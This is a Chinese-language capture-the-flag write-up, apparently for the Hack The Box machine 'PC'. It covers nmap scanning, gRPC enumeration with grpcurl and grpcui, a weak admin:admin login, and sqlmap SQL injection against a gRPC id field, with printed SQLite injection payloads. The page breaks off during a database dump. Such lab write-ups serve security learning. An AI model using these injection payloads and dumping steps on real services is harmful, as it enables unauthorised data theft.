<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  PC | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  PC</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-17T02:21:13.035Z" id="date"> 2023-07-17</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-17T03:59:25.281Z" id="updated"> 2023-07-17</time></div></span><br><span>Word Count: <div class="control">4.8k</div></span><br><span>Read Time: <div class="control">26 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/101968271_p0.jpg'><img src="/pic/101968271_p0.jpg" alt="101968271_p0"></p>
<span id="more"></span>



<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>懒得写了，干就完了。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.214<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 04:13 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.074s latency).<br>Not shown: 65533 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>50051/tcp open  unknown<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.49 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,50051 10.10.11.214<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 04:38 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.074s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)<br>|   256 84:86:a6:e2:04:ab:<span class="hljs-built_in">df</span>:f7:1d:45:6c:cf:39:58:09:de (ECDSA)<br>|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)<br>50051/tcp open  unknown<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port50051-TCP:V=7.94%I=7%D=7/16%Time=64B3AC75%P=x86_64-pc-linux-gnu%r(N<br>SF:ULL,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Generic<br>SF:Lines,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(GetRe<br>SF:quest,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(HTTPO<br>SF:ptions,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RTSP<br>SF:Request,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\</span><br><span class="hljs-string">SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RPC<br>SF:Check,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(DNSVe<br>SF:rsionBindReqTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\</span><br><span class="hljs-string">SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0</span><br><span class="hljs-string">SF:&quot;</span>)%r(DNSStatusRequestTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\</span><br><span class="hljs-string">SF:0\0\?\0\0&quot;</span>)%r(Help,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0</span><br><span class="hljs-string">SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\</span><br><span class="hljs-string">SF:0\0&quot;</span>)%r(SSLSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0</span><br><span class="hljs-string">SF:\?\0\0&quot;</span>)%r(TerminalServerCookie,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf</span><br><span class="hljs-string">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0</span><br><span class="hljs-string">SF:\0\0\0\0\0\?\0\0&quot;</span>)%r(TLSSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?</span><br><span class="hljs-string">SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0</span><br><span class="hljs-string">SF:8\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Kerberos,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(SMBProgNeg,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(X11Probe,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff</span><br><span class="hljs-string">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\</span><br><span class="hljs-string">SF:0\0\0\0\0\?\0\0&quot;</span>);<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|specialized<br>Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (95%), Crestron 2-Series (86%)<br>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series<br>Aggressive OS guesses: Linux 5.0 (95%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.43 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.214<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 05:10 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.075s latency).<br>Not shown: 999 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 45.29 seconds<br></code></pre></td></tr></table></figure>

<p>就发现开了22和50051端口，并且50051端口是啥也没扫出来。没有获得啥太好信息。</p>
<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><p>不管50051端口是啥，我们先浏览器访问一下，结果返回一堆乱码，解码一下好像也是无意义字符。看不出来50051端口到底跑的啥服务。</p>
<p>看看chatgpt怎么说：</p>
<p class='item-img' data-src='/pic/assets/00d720293729c20c9f1706d7252516eb.png'><img src="/pic/assets/00d720293729c20c9f1706d7252516eb.png" alt="00d720293729c20c9f1706d7252516eb"></p>
<p>为了防止chatgpt胡说，我们再google一下，发现确实50051是gRPC的默认端口，那么这台机子很有可能就跑的是gRPC服务。</p>
<p>那我们再google一下<code>gRPC exploit</code>，发现了一篇很详细的介绍了<a target="_blank" rel="noopener" href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">gRPC安全问题</a>的文章。文章中介绍gRPC SQL注入那段很详细的描述了gRPC的利用过程。</p>
<p class='item-img' data-src='/pic/assets/93bc6a1684e6ddbc20649254be3678e2.png'><img src="/pic/assets/93bc6a1684e6ddbc20649254be3678e2.png" alt="93bc6a1684e6ddbc20649254be3678e2"></p>
<p>虽然我们并不知道这台机子上的gRPC是否存在SQL注入漏洞，但是前面的连接gRPC的步骤是通用的，我们照葫芦画瓢收集下信息再说。当然当务之急是先把<code>grpcurl</code>和<code>grpcui</code>安装好，这个在github上下载对应版本的release即可，有go环境的可以直接用git安装。</p>
<h3 id="gRPC信息收集"><a href="#gRPC信息收集" class="headerlink" title="gRPC信息收集"></a>gRPC信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection<br><br>$ ./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp<br>SimpleApp.LoginUser<br>SimpleApp.RegisterUser<br>SimpleApp.getInfo<br></code></pre></td></tr></table></figure>

<p>简单的用grpcurl探测一下，发现50051端口上跑着的gRPC服务叫SimpleApp且有三个服务。那我们下一步就是用grpcui与它交互。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./grpcui -plaintext 10.10.11.214:50051<br>gRPC Web UI available at http://127.0.0.1:37383/<br></code></pre></td></tr></table></figure>

<p>然后我们访问本地网址就能看到页面。</p>
<p class='item-img' data-src='/pic/assets/7c33e952013b222dbfa570402a99c8d8.png'><img src="/pic/assets/7c33e952013b222dbfa570402a99c8d8.png" alt="7c33e952013b222dbfa570402a99c8d8"></p>
<p>如果我们尝试注册账户，然后利用注册的账号登录，就会返回一个id以及token。</p>
<p class='item-img' data-src='/pic/assets/0249cbde57c6732c87b88db6b781e5f2.png'><img src="/pic/assets/0249cbde57c6732c87b88db6b781e5f2.png" alt="0249cbde57c6732c87b88db6b781e5f2"></p>
<p>然后我们去用这个id和token去请求getInfo服务，就会返回：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Will update soon.&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>它给这id是啥意思，我们再创一个账号发现id是随机的，并不是规律递增，但如果我们请求id&#x3D;1会返回一条不一样的信息：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The admin is working hard to fix the issues.&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>这难道暗示id&#x3D;1的账户是admin吗？那我们尝试一下用admin登录一下，弱密码admin:admin一下就成功了。然而好像也没啥用，试了试好像用谁的token都可以任意访问id。</p>
<p>但换句话说好像也有用，这id的请求感觉没做任何限制很有可能存在脆弱性。加上我们之前看的那篇文章不就是利用gRPC上的SQL注入漏洞嘛，那我们就试试看究竟会不会有这个漏洞。</p>
<p>我们直接把请求保存成一个request.txt文件（用burpsuite或者火狐直接把请求复制出来都可以）准备用SQLmap看看是否存在漏洞，而且既然有admin权限的我们就用admin权限的，聊胜于无。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>sqlmap小测一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo sqlmap -r request.txt<br>        ___<br>       __H__<br> ___ ___[,]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [<span class="hljs-string">&quot;]     | .&#x27;| . |</span><br><span class="hljs-string">|___|_  [,]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 08:11:07 /2023-07-16/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[08:11:07] [INFO] parsing HTTP request from &#x27;request.txt&#x27;</span><br><span class="hljs-string">JSON data found in POST body. Do you want to process it? [Y/n/q]</span><br><span class="hljs-string">Cookie parameter &#x27;_grpcui_csrf_token&#x27; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]</span><br><span class="hljs-string">[08:11:09] [INFO] resuming back-end DBMS &#x27;sqlite&#x27;</span><br><span class="hljs-string">[08:11:09] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: JSON id ((custom) POST)</span><br><span class="hljs-string">    Type: boolean-based blind</span><br><span class="hljs-string">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="hljs-string">    Payload: &#123;&quot;</span>metadata<span class="hljs-string">&quot;:[&#123;&quot;</span>name<span class="hljs-string">&quot;:&quot;</span>token<span class="hljs-string">&quot;,&quot;</span>value<span class="hljs-string">&quot;:&quot;</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc<span class="hljs-string">&quot;&#125;],&quot;</span>data<span class="hljs-string">&quot;:[&#123;&quot;</span><span class="hljs-built_in">id</span><span class="hljs-string">&quot;:&quot;</span>164 AND 9042=9042<span class="hljs-string">&quot;&#125;]&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)</span><br><span class="hljs-string">    Payload: &#123;&quot;</span>metadata<span class="hljs-string">&quot;:[&#123;&quot;</span>name<span class="hljs-string">&quot;:&quot;</span>token<span class="hljs-string">&quot;,&quot;</span>value<span class="hljs-string">&quot;:&quot;</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc<span class="hljs-string">&quot;&#125;],&quot;</span>data<span class="hljs-string">&quot;:[&#123;&quot;</span><span class="hljs-built_in">id</span><span class="hljs-string">&quot;:&quot;</span>164 AND 7649=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))<span class="hljs-string">&quot;&#125;]&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="hljs-string">    Payload: &#123;&quot;</span>metadata<span class="hljs-string">&quot;:[&#123;&quot;</span>name<span class="hljs-string">&quot;:&quot;</span>token<span class="hljs-string">&quot;,&quot;</span>value<span class="hljs-string">&quot;:&quot;</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-0F6P51hC7QJZ-adEJ8kc<span class="hljs-string">&quot;&#125;],&quot;</span>data<span class="hljs-string">&quot;:[&#123;&quot;</span><span class="hljs-built_in">id</span><span class="hljs-string">&quot;:&quot;</span>-8074 UNION ALL SELECT CHAR(113,120,112,118,113)||CHAR(118,74,83,118,77,111,65,111,103,88,73,118,108,116,111,82,73,66,104,82,83,67,77,89,81,73,100,122,118,122,71,75,72,70,76,81,107,117,69,69)||CHAR(113,112,112,106,113)-- ngxu<span class="hljs-string">&quot;&#125;]&#125;</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[08:11:09] [INFO] the back-end DBMS is SQLite</span><br><span class="hljs-string">back-end DBMS: SQLite</span><br><span class="hljs-string">[08:11:09] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/127.0.0.1&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] ending @ 08:11:09 /2023-07-16/</span><br></code></pre></td></tr></table></figure>

<p>发现后端数据库用的是SQLite且确实存在SQL注入漏洞，在指定<code>--tables</code>以及<code>--columns</code>查看了下大致的表与列真是换，发现数据量不大之后，我们偷懒直接把数据库dump出来（真实情况下请勿dump！dump几十条数据下半辈子就要无忧了）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo sqlmap -r request.txt --dump<br>        ___<br>       __H__<br> ___ ___[)]_____ ___ ___  &#123;1.7.6<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [.]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 08:13:13 /2023-07-16/<br><br>[08:13:13] [INFO] parsing HTTP request from <span class="hljs-string">&#x27;request.txt&#x27;</span><br>JSON data found <span class="hljs-keyword">in</span> POST body. Do you want to process it? [Y/n/q]<br>Cookie parameter <span class="hljs-string">&#x27;_grpcui_csrf_token&#x27;</span> appears to hold anti-CSRF token. Do you want sqlmap to automatically update it <span class="hljs-keyword">in</span> further requests? [y/N]<br>[08:13:15] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;sqlite&#x27;</span><br>[08:13:15] [INFO] testing connection to the target URL<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: JSON <span class="hljs-built_in">id</span> ((custom) POST)<br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-<span class="hljs-number">0</span>F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;<span class="hljs-number">164</span> AND <span class="hljs-number">9042</span>=<span class="hljs-number">9042</span>&quot;&#125;]&#125;<br><br>    Type: time-based blind<br>    Title: SQLite &gt; <span class="hljs-number">2.0</span> AND time-based blind (heavy query)<br>    Payload: &#123;&quot;metadata&quot;:[&#123;&quot;name&quot;:&quot;token&quot;,&quot;value&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODk1MDgyMTZ9.xbeYrl62NpR9e9tz4dQaRm-<span class="hljs-number">0</span>F6P51hC7QJZ-adEJ8kc&quot;&#125;],&quot;data&quot;:[&#123;&quot;id&quot;:&quot;<span class="hljs-number">164</span> AND <span class="hljs-number">7649</span>=LIKE(CHAR(<span class="hljs-number">65</span>,<span class="hljs-number">66</span>,<span class="hljs-number">67</span>,<span class="hljs-number">68</span>,<span class="hljs-number">69</span>,<span class="hljs-number">70</span>,<span class="hljs-number">71</span>),UPPER(HEX(RANDOMBLOB(<span class="hljs-number">500000000</span>/<span 